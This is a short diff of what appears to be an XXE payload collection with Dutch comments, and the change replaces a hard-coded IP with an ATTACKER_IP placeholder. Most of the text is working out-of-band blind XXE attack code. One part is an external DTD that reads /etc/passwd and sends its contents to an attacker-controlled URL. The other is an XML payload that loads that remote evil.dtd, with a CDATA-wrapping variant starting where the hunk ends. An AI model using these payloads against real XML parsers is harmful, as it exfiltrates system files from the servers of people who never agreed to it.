@@ -10,11 +10,11 @@
 # === Out-of-Band (blind XXE) ===
 # Externe DTD (host op aanvaller als evil.dtd):
 # <!ENTITY % content SYSTEM "file:///etc/passwd">
-# <!ENTITY % wrapper "<!ENTITY &#37; exfil SYSTEM 'http://10.0.0.1/xxe?data=%content;'>">
+# <!ENTITY % wrapper "<!ENTITY &#37; exfil SYSTEM 'http://ATTACKER_IP/xxe?data=%content;'>">
 # %wrapper; %exfil;
 # Payload:
 <?xml version="1.0"?>
-<!DOCTYPE data [<!ENTITY % remote SYSTEM "http://10.0.0.1/evil.dtd"> %remote;]>
+<!DOCTYPE data [<!ENTITY % remote SYSTEM "http://ATTACKER_IP/evil.dtd"> %remote;]>
 <data>trigger</data>
 # === CDATA wrapping (voor bestanden met XML-tekens) ===
 # evil.dtd:
